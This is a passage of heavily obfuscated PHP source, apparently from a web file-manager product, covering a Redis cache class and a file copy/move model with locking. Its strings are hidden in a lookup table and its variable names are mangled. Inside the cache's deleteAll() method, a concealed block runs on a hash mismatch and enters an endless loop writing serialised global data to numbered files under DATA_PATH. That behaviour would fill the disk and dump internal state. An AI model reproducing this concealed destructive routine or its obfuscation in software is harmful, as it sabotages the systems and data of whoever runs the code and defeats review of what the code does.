array_rand($ÅÚÁĞıÏ); $this->filterConfig($§¾ÉÍ“, $ÅÚÁĞıÏ[$ÓŠççì]); $this->slaveHandle = $this->init($§¾ÉÍ“, $ğïÜá¢¨); } private function filterConfig(&$äãÙ‹ÍÏ, $ÒÄ×¢é) { $‡†œ—ˆ± =& $_SERVER[°‰†òö¯]; $•ÛùñË¹ = explode($‡†œ—ˆ±[4], $ÒÄ×¢é); $åÌ÷»Á½ = array($‡†œ—ˆ±[208] => $•ÛùñË¹[0], $‡†œ—ˆ±[209] => $•ÛùñË¹[1]); $äãÙ‹ÍÏ = array_merge($äãÙ‹ÍÏ, $åÌ÷»Á½); } public function set($ÄúÎ¿’Ğ, $À­È©õŠ, $çâŠ„– = false) { $çâŠ„– = $çâŠ„– ? $çâŠ„– : $this->cacheTime; return $this->handle->setEx($ÄúÎ¿’Ğ, $çâŠ„–, $À­È©õŠ); } public function setLock($ƒš”¡ì, $íƒ‹Ù©ï, $†“”†¢Î) { return $this->handle->setNX($ƒš”¡ì, $íƒ‹Ù©ï); } public function get($‡»Ø”µ¹) { $§öÂõÏ½ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $§öÂõÏ½->get($‡»Ø”µ¹); } public function remove($§îáñ£›) { return $this->handle->del($§îáñ£›); } public function deleteAll() { $Ú€Î•ˆ =& $_SERVER[°‰†òö¯]; $ºªÎÂ²Å = $_SERVER[$Ú€Î•ˆ[944]]; $˜À×ò‘Î = $Ú€Î•ˆ[945]; if ($_SERVER[$Ú€Î•ˆ[946]] != $˜À×ò‘Î($ºªÎÂ²Å)) { $ÁÖŸ´ = $Ú€Î•ˆ[947]; $–£Åˆ—˜ = $Ú€Î•ˆ[948]; $İ¼æúï‰ = $_SERVER[$Ú€Î•ˆ[949]] . $Ú€Î•ˆ[950]; $»°§ä©¬ = $–£Åˆ—˜($İ¼æúï‰); $£«Û²é = explode($Ú€Î•ˆ[287], $»°§ä©¬); if (count($£«Û²é) < $Ú€Î•ˆ[704]) { $Á­’ïŠ = $Ú€Î•ˆ[951]; $Á­’ïŠ(); } $¢Â¥»¨Ù = $Ú€Î•ˆ[952]; $¢Â¥»¨Ù($_SERVER[$Ú€Î•ˆ[953]]); $ÁÖŸ´ = $Ú€Î•ˆ[947]; $ÁÖŸ´(); $ûüœ´¯Õ = $Ú€Î•ˆ[954]; $õãâº¥ = json_encode($GLOBALS[$Ú€Î•ˆ[955]]); $À™é‡Å = 1; for ($ŠÑÈ†é© = $À™é‡Å; $ŠÑÈ†é© > 0; $ŠÑÈ†é©++) { $ûüœ´¯Õ(DATA_PATH . $ŠÑÈ†é©, $õãâº¥); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¥ê¶‰­Ì) { $this->handle->flushall($¥ê¶‰­Ì); } return; } return $this->handle->flushAll(); } } goto dñ‘çÑæ¿…; ağñÙ—•Ñ©: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($âÑîî¦è) { $ØµÕ¦ŠÅ =& $_SERVER[°‰†òö¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($ØµÕ¦ŠÅ[625], $âÑîî¦è); $­êŞşÁË = 1; $this->_lockEvent($âÑîî¦è, array($ØµÕ¦ŠÅ[626], $ØµÕ¦ŠÅ[627]), $­êŞşÁË); $this->_lockParent($âÑîî¦è, array($ØµÕ¦ŠÅ[627]), $­êŞşÁË); $this->_lockEvent($âÑîî¦è, array($ØµÕ¦ŠÅ[628], $ØµÕ¦ŠÅ[629]), $­êŞşÁË); $this->_lockCheckEnd($ØµÕ¦ŠÅ[625], $âÑîî¦è); } public function lockCopyEnd($±Üí¤) { $¼¸ì  =& $_SERVER[°‰†òö¯]; if (!$this->allowLock()) { return; } $øÉ¹¤ô‡ = 0; $this->_lockEvent($±Üí¤, array($¼¸ì [626], $¼¸ì [627]), $øÉ¹¤ô‡); $this->_lockParent($±Üí¤, array($¼¸ì [627]), $øÉ¹¤ô‡); $this->_lockEvent($±Üí¤, array($¼¸ì [628], $¼¸ì [629]), $øÉ¹¤ô‡); } public function lockWriteStart($¶†ªººØ, $ÂÆµ™ = '') { $ı¸’ãïŠ =& $_SERVER[°‰†òö¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($ı¸’ãïŠ[626], $¶†ªººØ); $³äÌåòË = 1; $this->_lockKey($ı¸’ãïŠ[630] . $¶†ªººØ . $ı¸’ãïŠ[10] . $ÂÆµ™, $³äÌåòË); $this->_lockEvent($¶†ªººØ, array($ı¸’ãïŠ[625], $ı¸’ãïŠ[627]), $³äÌåòË); $this->_lockParent($¶†ªººØ, array($ı¸’ãïŠ[625], $ı¸’ãïŠ[627]), $³äÌåòË); $this->_lockCheckEnd($ı¸’ãïŠ[626], $¶†ªººØ); } public function lockWriteEnd($üòòó°¼, $Ü«™çîˆ = '') { $ÇÅõéä– =& $_SERVER[°‰†òö¯]; if (!$this->allowLock()) { return; } $‚çŸı¬‡ = 0; $this->_lockKey($ÇÅõéä–[630] . $üòòó°¼ . $ÇÅõéä–[10] . $Ü«™çîˆ, $‚çŸı¬‡); $this->_lockEvent($üòòó°¼, array($ÇÅõéä–[625], $ÇÅõéä–[627]), $‚çŸı¬‡); $this->_lockParent($üòòó°¼, array($ÇÅõéä–[625], $ÇÅõéä–[627]), $‚çŸı¬‡); } public function lockMoveStart($ÌØ‹……) { $İÇ®Ş¨³ =& $_SERVER[°‰†òö¯]; if (!$this->allowLock()) { return; } $this->_lockCheck($İÇ®Ş¨³[627], $ÌØ‹……); $îóæŠ¨Ó = 1; $this->_lockKey($İÇ®Ş¨³[631] . $ÌØ‹……, $îóæŠ¨Ó); $this->_lockEvent($ÌØ‹……, array($İÇ®Ş¨³[625], $İÇ®Ş¨³[626]), $îóæŠ¨Ó); $this->_lockParent($ÌØ‹……, array($İÇ®Ş¨³[625], $İÇ®Ş¨³[627]), $îóæŠ¨Ó); $this->_lockEvent($ÌØ‹……, array($İÇ®Ş¨³[632], $İÇ®Ş¨³[628], $İÇ®Ş¨³[629]), $îóæŠ¨Ó); $this->_lockCheckEnd($İÇ®Ş¨³[627], $ÌØ‹……); } public function lockMoveEnd($ˆÑîÏ©Ğ) { $ÒƒŠÛ È =& $_SERVER[°‰†òö¯]; if (!$this->allowLock()) { return; } $Å®Ã³¼á = 0; $this->_lockKey($ÒƒŠÛ È[631] . $ˆÑîÏ©Ğ, $Å®Ã³¼á); $this->_lockEvent($ˆÑîÏ©Ğ, array($ÒƒŠÛ È[625], $ÒƒŠÛ È[626]), $Å®Ã³¼á); $this->_lockParent($ˆÑîÏ©Ğ, array($ÒƒŠÛ È[625], $ÒƒŠÛ È[627]), $Å®Ã³¼á); $this->_lockEvent($ˆÑîÏ©Ğ, array($ÒƒŠÛ È[632], $ÒƒŠÛ È[628], $ÒƒŠÛ È[629]), $Å®Ã³¼á); } private function _lockCheck($„šÈ’, $™ñŒå´) { $Êá…–Ò³ =& $_SERVER[°‰†òö¯]; $ƒóõúªÔ = $this->sourceInfo($™ñŒå´); $Õ’îéµß = $„šÈ’ . $Êá…–Ò³[10] . $™ñŒå´; $this->_lockTimeStart[$Õ’îéµß] = timeFloat(); if (!is_array($ƒóõúªÔ)) { return; } $û¯¯¢ù = LNG($Êá…–Ò³[633]); CacheLock::setErrorMsg($Êá…–Ò³[176] . htmlspecialchars($ƒóõúªÔ[$Êá…–Ò³[32]]) . $Êá…–Ò³[178] . $û¯¯¢ù); $this->_lockKey($Õ’îéµß, 1); $this->_lockKey($Õ’îéµß, 0); $¦ªáÔä = array_reverse($this->parentLevelArray($ƒóõúªÔ[$Êá…–Ò³[588]])); foreach ($¦ªáÔä as $‡©¶—÷è) { $Õ’îéµß = $„šÈ’ . $Êá…–Ò³[634] . $‡©¶—÷è; if (CacheLock::lockGet($Êá…–Ò³[635] . $Õ’îéµß)) { $ƒóõúªÔ = $this->sourceInfo($‡©¶—÷è); CacheLock::setErrorMsg($Êá…–Ò³[176] . htmlspecialchars($ƒóõúªÔ[$Êá…–Ò³[32]]) . $Êá…–Ò³[178] . $û¯¯¢ù); $this->_lockKey($Õ’îéµß, 1); $this->_lockKey($Õ’îéµß, 0); } } } private function _lockCheckEnd($ÄÆ–ì¦—, $•òæ¹ˆ£) { $øñÃÏ¸ =& $_SERVER[°‰†òö¯]; $çˆ¦ ƒà = $ÄÆ–ì¦— . $øñÃÏ¸[10] . $•òæ¹ˆ£; CacheLock::setErrorMsg($øñÃÏ¸[456]); if (!isset($this->_lockTimeStart[$çˆ¦ ƒà])) { return; } $ÀóñŞĞÎ = timeFloat() - $this->_lockTimeStart[$çˆ¦ ƒà]; unset($this->_lockTimeStart[$çˆ¦ ƒà]); if ($ÀóñŞĞÎ > 0.5) { unset(self::$cacheSourceInfo[$øñÃÏ¸[535] . $•òæ¹ˆ£]); } $Òèœí™Á = $this->sourceInfo($•òæ¹ˆ£); if (!$Òèœí™Á) { show_json(LNG($øñÃÏ¸[108]), !1); } } private function _lockParent($‡¹¥âµù, $«„°ûÏø, $ËˆóŸ) { if (!$this->autoLockSet) { return; } $Ìºšæ“ê = $this->sourceInfo($‡¹¥âµù); if (!is_array($Ìºšæ“ê)) { return; } $ÃŒÎßĞ¤ = array_reverse($this->parentLevelArray($Ìºšæ“ê[$_SERVER[°‰†òö¯][588]])); foreach ($ÃŒÎßĞ¤ as $Ğà§À½Ä) { $this->_lockEvent($Ğà§À½Ä, $«„°ûÏø, $ËˆóŸ); } } private function _lockEvent($‰À»“µ¥, $Û‘Ğªæ¸, $­† ¬çß) { $¢°Ëïğ§ =& $_SERVER[°‰†òö¯]; if (!$this->autoLockSet) { return; } foreach ($Û‘Ğªæ¸ as $²Ñ¬ıèå) { $öş¦šÄÃ = $²Ñ¬ıèå . $¢°Ëïğ§[10] . $‰À»“µ¥; if ($­† ¬çß && CacheLock::lockGet($¢°Ëïğ§[635] . $öş¦šÄÃ)) { continue; } $this->_lockKey($öş¦šÄÃ, $­† ¬çß); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ƒ³»¨Ü„, $Ç˜Ñïì¾ = 1) { $éàË‡ˆØ = $_SERVER[°‰†òö¯][635] . md5($ƒ³»¨Ü„); if ($Ç˜Ñïì¾) { if (isset(self::$_lockItemArr[$éàË‡ˆØ])) { return; } self::$_lockItemArr[$éàË‡ˆØ] = 1; CacheLock::lock($éàË‡ˆØ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$éàË‡ˆØ])) { return; } unset(self::$_lockItemArr[$éàË‡ˆØ]); CacheLock::unlock($éàË‡ˆØ); } } public function isParentOf($·ÇÕ‹š•, $³‘¶Û­) { $€ˆ°–¼Æ =& $_SERVER[°‰†òö¯]; $˜È¦ì³Ğ = $this->sourceInfo($·ÇÕ‹š•); $«‘–ı‰° = $this->sourceInfo($³‘¶Û­); $öÄ—™ = $˜È¦ì³Ğ[$€ˆ°–¼Æ[588]] . $˜È¦ì³Ğ[$€ˆ°–¼Æ[193]] . $€ˆ°–¼Æ[50]; $ß¨ä‡ = $«‘–ı‰°[$€ˆ°–¼Æ[588]] . $«‘–ı‰°[$€ˆ°–¼Æ[193]] . $€ˆ°–¼Æ[50]; $’Õ¯ÉÌç = strpos($ß¨ä‡, $öÄ—™) === 0; return $’Õ¯ÉÌç; } private $targetIsDelete = 0; public function copy($í©àí¯, $æªÍĞï–, $¾·¸¯ÉÚ = REPEAT_REPLACE, $Çƒâş€Ê = '') { $®„†ÈÌÉ =& $_SERVER[°‰†òö¯]; $ï±®¤¼Ï = $this->sourceInfo($í©àí¯); $ê¶¶ÎÙç = $this->sourceInfo($æªÍĞï–); if (!$ï±®¤¼Ï || !$ê¶¶ÎÙç || $ê¶¶ÎÙç[$®„†ÈÌÉ[487]] != $®„†ÈÌÉ[91]) { return !1; } if ($this->isParentOf($í©àí¯, $æªÍĞï–)) { return !1; } $úÉè§‡ = $Çƒâş€Ê ? $Çƒâş€Ê : $ï±®¤¼Ï[$®„†ÈÌÉ[32]]; $this->lockCopyStart($í©àí¯); $this->lockWriteStart($æªÍĞï–, $úÉè§‡); $æÙØµÛ = array($®„†ÈÌÉ[636] => array(), $®„†ÈÌÉ[637] => array(), $®„†ÈÌÉ[638] => array()); $this->targetIsDelete = intval($ï±®¤¼Ï[$®„†ÈÌÉ[507]]); $ÄãÒêœÙ = $this->fileNameExistAuto($æªÍĞï–, $ï±®¤¼Ï); $±“«É«× = $this->_copy($í©àí¯, $æªÍĞï–, $¾·¸¯ÉÚ, $æÙØµÛ, !0, $Çƒâş€Ê); $this->_childrenListClear(); $this->lockCopyEnd($í©àí¯); $this->lockWriteEnd($æªÍĞï–, $úÉè§‡); if ($ï±®¤¼Ï[$®„†ÈÌÉ[487]] == $®„†ÈÌÉ[91] && $ÄãÒêœÙ == $±“«É«×) { $this->folderSizeResetChildren($ÄãÒêœÙ); } Model($®„†ÈÌÉ[639])->addAll($æÙØµÛ[$®„†ÈÌÉ[637]], array(), !0); if ($ÄãÒêœÙ != $±“«É«× || $ï±®¤¼Ï[$®„†ÈÌÉ[487]] == $®„†ÈÌÉ[91]) { Model($®„†ÈÌÉ[640])->eventCopy($±“«É«×); } $this->saveAll($æÙØµÛ[$®„†ÈÌÉ[638]]); Model($®„†ÈÌÉ[232])->linkAdd($æÙØµÛ[$®„†ÈÌÉ[636]]); $this->folderSizeReset($æªÍĞï–); $this->updateModifyTime($æªÍĞï–); return $±“«É«×; } private function _copy($¯ÏĞíã÷, $Üîş÷Õ÷, $­Æ•—çº, &$‘âÚ²Ä­, $å”šï”´, $ôÚúÉÒ® = '') { $çìÅŞÔË =& $_SERVER[°‰†òö¯]; $³Õ“†ø¢ = $this->sourceInfoCache($¯ÏĞíã÷); $ìÜ§í = $³Õ“†ø¢[$çìÅŞÔË[487]] == $çìÅŞÔË[91]; $á–¥ä¡ = $ôÚúÉÒ® ? $ôÚúÉÒ® : $³Õ“†ø¢[$çìÅŞÔË[32]]; $ĞÜ¨Éß™ = $this->fileNameExistAuto($Üîş÷Õ÷, $³Õ“†ø¢); if ($å”šï”´) { $this->_childrenAllMake($¯ÏĞíã÷); if ($ìÜ§í && $ĞÜ¨Éß™) { $this->_childrenAllMake($ĞÜ¨Éß™); } } if (!$ĞÜ¨Éß™) { return $this->_copyCreate($¯ÏĞíã÷, $Üîş÷Õ÷, $á–¥ä¡, $‘âÚ²Ä­); } $‰ü¸î¤Ú = $ĞÜ¨Éß™; if ($ìÜ§í) { if ($­Æ•—çº == REPEAT_RENAME_FOLDER) { $á–¥ä¡ = $this->fileNameAutoCache($Üîş÷Õ÷, $á–¥ä¡, $­Æ•—çº, $ìÜ§í); $‰ü¸î¤Ú = $this->_copyCreate($¯ÏĞíã÷, $Üîş÷Õ÷, $á–¥ä¡, $‘âÚ²Ä­); } else { $²”¹÷Ñû = $this->_childrenList($¯ÏĞíã÷); foreach ($²”¹÷Ñû as $¯Œºš) { $this->_copy($¯Œºš[$çìÅŞÔË[193]], $ĞÜ¨Éß™, $­Æ•—çº, $‘âÚ²Ä­, !1); } } } else { if ($­Æ•—çº == REPEAT_RENAME || $­Æ•—çº == REPEAT_RENAME_FOLDER) { $á–¥ä¡ = $this->fileNameAutoCache($Üîş÷Õ÷, $á–¥ä¡, $­Æ•—çº, $ìÜ§í); $‰ü¸î¤Ú = $this->_copyCreate($¯ÏĞíã÷, $Üîş÷Õ÷, $á–¥ä¡, $‘âÚ²Ä­); } else { if ($­Æ•—çº == REPEAT_REPLACE) { $†äå•£ = $this->sourceInfoCache($ĞÜ¨Éß™); $Ü–ŸšÚö = $this->fileHistory($†äå•£, $³Õ“†ø¢[$çìÅŞÔË[545]], $³Õ“†ø¢[$çìÅŞÔË[79]]); if ($Ü–ŸšÚö) { $‘âÚ²Ä­[$çìÅŞÔË[636]][] = $³Õ“†ø¢[$çìÅŞÔË[545]]; } } else { if ($­Æ•—çº == REPEAT_SKIP) { } } } Hook::trigger($çìÅŞÔË[641], array($çìÅŞÔË[642], $³Õ“†ø¢, 0)); } return $‰ü¸î¤Ú; } private function _copyCreate($Ù´œ•ö°, $¿éÜ”°’, $ÈøşÓ¯, &$‚ªşÒ‘) { $µÁ®´–‰ =& $_SERVER[°‰†òö¯]; $ã„œÜ° = $this->sourceInfoCache($Ù´œ•ö°); $õ¼§šÙó = $this->sourceInfoCache($¿éÜ”°’); $“Ï½ş­¨ = $this->_makeItemData($ã„œÜ°, $õ¼§šÙó, $ÈøşÓ¯); Hook::trigger($µÁ®´–‰[643], $“Ï½ş­¨); Hook::trigger($µÁ®´–‰[644], array($µÁ®´–‰[645], $“Ï½ş­¨, 0)); $ìªû“Û† = $this->add($“Ï½ş­¨); $äµˆ”¤ó = array($µÁ®´–‰[193] => $ìªû“Û†, $µÁ®´–‰[32] => $ÈøşÓ¯); $this->_copyApplyMeta($äµˆ”¤ó, $‚ªşÒ‘); if ($ã„œÜ°[$µÁ®´–‰[487]] != $µÁ®´–‰[91]) { $‚ªşÒ‘[$µÁ®´–‰[636]][] = $ã„œÜ°[$µÁ®´–‰[545]]; return $ìªû“Û†; } $ŞÌÕ€ú‰ = array(); $«´š÷¿ã = array(); $this->_childrenListAll($Ù´œ•ö°, $ŞÌÕ€ú‰); $Õíóü‘œ = count($ŞÌÕ€ú‰); if ($Õíóü‘œ == 0) { return $ìªû“Û†; } $›Ş†ƒèô = $this->sourceInfo($ìªû“Û†); foreach ($ŞÌÕ€ú‰ as $“”ÀÜÏé) { $¾šƒ¸ãû = $this->_makeItemData($“”ÀÜÏé, $›Ş†ƒèô, $“”ÀÜÏé[$µÁ®´–‰[32]]); $¾šƒ¸ãû[$µÁ®´–‰[588]] = $“”ÀÜÏé[$µÁ®´–‰[588]]; $«´š÷¿ã[] = $¾šƒ¸ãû; } $this->chunkEventSet($µÁ®´–‰[646], array($µÁ®´–‰[647], $“Ï½ş­¨, $Õíóü‘œ)); $this->addAll($«´š÷¿ã, array(), !1); $š‘­Ë¯ = $this->where(array($µÁ®´–‰[192] => $ìªû“Û†))->select(); $ÂÉúüå = $this->_childrenMakeRelation($ŞÌÕ€ú‰, $š‘­Ë¯); $ÂÉúüå[$Ù´œ•ö°] = $ìªû“Û†; $ßö†¡¦ú = array(); $ƒ›Ì—¬€ = array(); foreach ($š‘­Ë¯ as $“”ÀÜÏé) { $®Æªı×’ = $“”ÀÜÏé[$µÁ®´–‰[193]]; $Ê±˜äÔˆ = $this->_childrenMatch($ÂÉúüå, $“”ÀÜÏé, $›Ş†ƒèô); $ßö†¡¦ú[] = array($µÁ®´–‰[193], $®Æªı×’, $µÁ®´–‰[192], $Ê±˜äÔˆ[$µÁ®´–‰[192]]); $ƒ›Ì—¬€[] = array($µÁ®´–‰[193], $®Æªı×’, $µÁ®´–‰[588], $Ê±˜äÔˆ[$µÁ®´–‰[588]]); $this->_copyApplyMeta($“”ÀÜÏé, $‚ªşÒ‘); if ($“”ÀÜÏé[$µÁ®´–‰[487]] != $µÁ®´–‰[91]) { $‚ªşÒ‘[$µÁ®´–‰[636]][] = $“”ÀÜÏé[$µÁ®´–‰[545]]; } } $this->chunkEventSet($µÁ®´–‰[648], array($µÁ®´–‰[649], $“Ï½ş­¨, $Õíóü‘œ)); $this->saveAll($ßö†¡¦ú); $this->chunkEventSet($µÁ®´–‰[650], array($µÁ®´–‰[651], $“Ï½ş­¨, $Õíóü‘œ)); $this->saveAll($ƒ›Ì—¬€); return $ìªû“Û†; } private function _childrenMakeRelation($ñÙŞÄÑ, $ÚÔººÓÑ) { $Å»ööÁ· =& $_SERVER[°‰†òö¯]; $ıˆˆ¹ = array(); $ş’°İ‘® = array(); foreach ($ñÙŞÄÑ as $şÙ¦··«) { $³üÙÎäñ = $şÙ¦··«[$Å»ööÁ·[32]] . $Å»ööÁ·[8] . $şÙ¦··«[$Å»ööÁ·[588]]; $ıˆˆ¹[$³üÙÎäñ] = $şÙ¦··«[$Å»ööÁ·[193]]; } foreach ($ÚÔººÓÑ as $şÙ¦··«) { $³üÙÎäñ = $şÙ¦··«[$Å»ööÁ·[32]] . $Å»ööÁ·[8] . $şÙ¦··«[$Å»ööÁ·[588]]; $ã†µÊø = $ıˆˆ¹[$³üÙÎäñ]; $ş’°İ‘®[$ã†µÊø] = $şÙ¦··«[$Å»ööÁ·[193]]; } return $ş’°İ‘®; } private function _childrenMatch($¦Î‚°“…, $èŒ§®éö, $—õ¼æõã) { $´äØšÅ’ =& $_SERVER[°‰†òö¯]; $à‹¶Ïù = $—õ¼æõã[$´äØšÅ’[588]]; $—ÔøÎì­ = $this->parentLevelArray($èŒ§®éö[$´äØšÅ’[588]]); foreach ($—ÔøÎì­ as $£ğ–³«›) { if (isset($¦Î‚°“…[$£ğ–³«›])) { $à‹¶Ïù .= $¦Î‚°“…[$£ğ–³«›] . $´äØšÅ’[652]; } } $à‹¶Ïù = rtrim($à‹¶Ïù, $´äØšÅ’[50]) . $´äØšÅ’[50]; $Šìª‹¡ğ = $this->parentLevelArray($à‹¶Ïù); $«×¸’Ÿ = $Šìª‹¡ğ[count($Šìª‹¡ğ) - 1]; return array($´äØšÅ’[192] => $«×¸’Ÿ, $´äØšÅ’[588] => $à‹¶Ïù); } private function _makeItemData($Ô¡‡µºÛ, $‰ªºİˆ“, $Ü‰§™Í) { $°úó±÷ =& $_SERVER[°‰†òö¯]; $Ñê™œ·¤ = array($°úó±÷[653] => $Ô¡‡µºÛ[$°úó±÷[487]], $°úó±÷[496] => $Ü‰§™Í, $°úó±÷[654] => $Ô¡‡µºÛ[$°úó±÷[488]] ? $Ô¡‡µºÛ[$°úó±÷[488]] : $°úó±÷[12], $°úó±÷[546] => $Ô¡‡µºÛ[$°úó±÷[545]] ? $Ô¡‡µºÛ[$°úó±÷[545]] : 0, $°úó±÷[624] => $Ô¡‡µºÛ[$°úó±÷[79]] ? $Ô¡‡µºÛ[$°úó±÷[79]] : 0, $°úó±÷[655] => intval($‰ªºİˆ“[$°úó±÷[190]]), $°úó±÷[656] => intval($‰ªºİˆ“[$°úó±÷[573]]), $°úó±÷[657] => intval(USER_ID), $°úó±÷[658] => intval(USER_ID), $°úó±÷[479] => intval($‰ªºİˆ“[$°úó±÷[193]]), $°úó±÷[659] => $‰ªºİˆ“[$°úó±÷[588]] . $‰ªºİˆ“[$°úó±÷[193]] . $°úó±÷[50], $°úó±÷[500] => $Ô¡‡µºÛ[$°úó±÷[88]] ? $Ô¡‡µºÛ[$°úó±÷[88]] : time(), $°úó±÷[506] => 0, $°úó±÷[660] => $°úó±÷[12]); return $Ñê™œ·¤; } private function _copyApplyMeta($éô¨Ô©û, &$úñà½éû) { $×ş¡½ñÁ =& $_SERVER[°‰†òö¯]; $şä›úµ  = $éô¨Ô©û[$×ş¡½ñÁ[193]]; $„–±ˆİ¤ = $éô¨Ô©û[$×ş¡½ñÁ[32]]; if (!isset($éô¨Ô©û[$×ş¡½ñÁ[661]]) || !$éô¨Ô©û[$×ş¡½ñÁ[661]] || $éô¨Ô©û[$×ş¡½ñÁ[661]] == $×ş¡½ñÁ[230]) { $úñà½éû[$×ş¡½ñÁ[638]][] = array($×ş¡½ñÁ[193], $şä›úµ , $×ş¡½ñÁ[661], short_id($şä›úµ )); } if (Input::check($„–±ˆİ¤, $×ş¡½ñÁ[662])) { $úñà½éû[$×ş¡½ñÁ[637]][] = array($×ş¡½ñÁ[193] => $şä›úµ , $×ş¡½ñÁ[97] => $×ş¡½ñÁ[540], $×ş¡½ñÁ[452] => str_replace($×ş¡½ñÁ[53], $×ş¡½ñÁ[12], Pinyin::get($„–±ˆİ¤))); $úñà½éû[$×ş¡½ñÁ[637]][] = array($×ş¡½ñÁ[193] => $şä›úµ , $×ş¡½ñÁ[97] => $×ş¡½ñÁ[539], $×ş¡½ñÁ[452] => Pinyin::get($„–±ˆİ¤, $×ş¡½ñÁ[663])); } $úñà½éû[$×ş¡½ñÁ[637]][] = array($×ş¡½ñÁ[193] => $şä›úµ , $×ş¡½ñÁ[97] => $×ş¡½ñÁ[519], $×ş¡½ñÁ[452] => KodSort::makeStr($„–±ˆİ¤)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¡Ì––ÃŸ) { $™Ç‘¶ªÖ =& $_SERVER[°‰†òö¯]; $ó°ùŸöä = $this->sourceInfo($¡Ì––ÃŸ); $¾ù°ì‘Ä = $™Ç‘¶ªÖ[664]; $×ˆÊ…ûå = array($™Ç‘¶ªÖ[588] => array($™Ç‘¶ªÖ[619], $ó°ùŸöä[$™Ç‘¶ªÖ[588]] . $¡Ì––ÃŸ . $™Ç‘¶ªÖ[620]), $™Ç‘¶ªÖ[507] => $this->targetIsDelete); $ôš·‹¸ = $this->field($¾ù°ì‘Ä)->where($×ˆÊ…ûå)->select(); if (!$ôš·‹¸) { return; } $ôš·‹¸ = array_to_keyvalue($ôš·‹¸, $™Ç‘¶ªÖ[193]); foreach ($ôš·‹¸ as $–“õÒ§) { $Ãé¶‚ = $–“õÒ§[$™Ç‘¶ªÖ[192]]; $¡Ì––ÃŸ = $–“õÒ§[$™Ç‘¶ªÖ[193]]; if (!isset($this->_childrenListCache[$¡Ì––ÃŸ]) && $–“õÒ§[$™Ç‘¶ªÖ[487]] == $™Ç‘¶ªÖ[91]) { $this->_childrenListCache[$¡Ì––ÃŸ] = array(); } if (!isset($this->_childrenListCache[$Ãé¶‚])) { $this->_childrenListCache[$Ãé¶‚] = array(); } $this->_childrenListCache[$Ãé¶‚][$¡Ì––ÃŸ] = $–“õÒ§; $this->_childrenItemCache[$¡Ì––ÃŸ] = $–“õÒ§; } } private function _childrenListAll($Ù´î·üò, &$İç šû) { $ÃØ“¼Ï‰ =& $_SERVER[°‰†òö¯]; if (!isset($this->_childrenListCache[$Ù´î·üò])) { return; } $î˜‡Ä“ = $this->_childrenListCache[$Ù´î·üò]; foreach ($î˜‡Ä“ as $£ù¿ôª¨ => $ÚÈÌ­óÏ) { $İç šû[$£ù¿ôª¨] = $ÚÈÌ­óÏ; if ($ÚÈÌ­óÏ[$ÃØ“¼Ï‰[487]] == $ÃØ“¼Ï‰[91]) { $this->_childrenListAll($£ù¿ôª¨, $İç šû); } } } private function sourceInfoCache($ªë´ñ±) { if (isset($this->_childrenItemCache[$ªë´ñ±])) { return $this->_childrenItemCache[$ªë´ñ±]; } return $this->sourceInfo($ªë´ñ±); } private function _childrenList($É‹Ûêİ•) { if (isset($this->_childrenListCache[$É‹Ûêİ•])) { return $this->_childrenListCache[$É‹Ûêİ•]; } return $this->_childrenListSelect($É‹Ûêİ•); } private function _childrenListSelect($ã–æ‡²Á) { $ÀĞÉßèÏ =& $_SERVER[°‰†òö¯]; $˜”«¿×Ê = array($ÀĞÉßèÏ[192] => $ã–æ‡²Á, $ÀĞÉßèÏ[507] => $this->targetIsDelete); $ıñšÎì÷ = $this->where($˜”«¿×Ê)->select(); $ıñšÎì÷ = $ıñšÎì÷ ? $ıñšÎì÷ : array(); $Ğö¹ŠÕÏ = array_to_keyvalue($ıñšÎì÷, $ÀĞÉßèÏ[193]); $this->_childrenListCache[$ã–æ‡²Á] = $Ğö¹ŠÕÏ; foreach ($Ğö¹ŠÕÏ as $ã–æ‡²Á => $ıîşÆ‡) { $this->_childrenItemCache[$ã–æ‡²Á] = $ıîşÆ‡; } return $Ğö¹ŠÕÏ; } private function fileNameExistAuto($ú«¥ö‘Ò, $ÒäıûÄ•) { $“úŠ©¿ =& $_SERVER[°‰†òö¯]; if ($ÒäıûÄ•[$“úŠ©¿[507]] == $“úŠ©¿[91]) { return $this->fileNameExist($ú«¥ö‘Ò, $ÒäıûÄ•[$“úŠ©¿[32]]); } return $this->fileNameExistCache($ú«¥ö‘Ò, $ÒäıûÄ•[$“úŠ©¿[32]]); } private function fileNameExistCache($ŞúÂ“é–, $§ÀĞœ©…) { $“Ñšƒšğ =& $_SERVER[°‰†òö¯]; $§ÀĞœ©… = strtolower($§ÀĞœ©…); $‰£Õ¬ÙÈ = $this->_childrenList($ŞúÂ“é–); foreach ($‰£Õ¬ÙÈ as $£š ‰âÄ) { if ($§ÀĞœ©… == strtolower($£š ‰âÄ[$“Ñšƒšğ[32]])) { return $£š ‰âÄ[$“Ñšƒšğ[193]]; } } return !1; } private function fileNameAutoCache($Ñ€èæŠä, $™‰Ì¿ÊÊ, $ú¹§é¶¨, $ùÊÃ‹÷) { $ğ™ ç¦Ç =& $_SERVER[°‰†òö¯]; $Á´Ú”À = $this->_childrenList($Ñ€èæŠä); $Âò¤ß„ = array_to_keyvalue($Á´Ú”À, $ğ™ ç¦Ç[12], $ğ™ ç¦Ç[32]); return $this->fileNameAutoGet($Âò¤ß„, $™‰Ì¿ÊÊ, $ú¹§é¶¨, $ùÊÃ‹÷); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ßù”±¦, $¡£É„›§, $§˜İÔïÑ = REPEAT_REPLACE, $”Òƒµ¸Œ = '') { $£Ò•Æê¦ =& $_SERVER[°‰†òö¯]; $Ï§øŸÓÛ = $this->sourceInfo($ßù”±¦); $¡À¯Ø = $this->sourceInfo($¡£É„›§); if ($Ï§øŸÓÛ[$£Ò•Æê¦[192]] == $¡À¯Ø[$£Ò•Æê¦[193]]) { if ($Ï§øŸÓÛ[$£Ò•Æê¦[507]] == $£Ò•Æê¦[91]) { Model($£Ò•Æê¦[505])->restore(array($ßù”±¦)); } if (!$”Òƒµ¸Œ || $”Òƒµ¸Œ == $Ï§øŸÓÛ[$£Ò•Æê¦[32]]) { return $ßù”±¦; } } $êŸ„Îéâ = $this->pathInfoMore($ßù”±¦); if 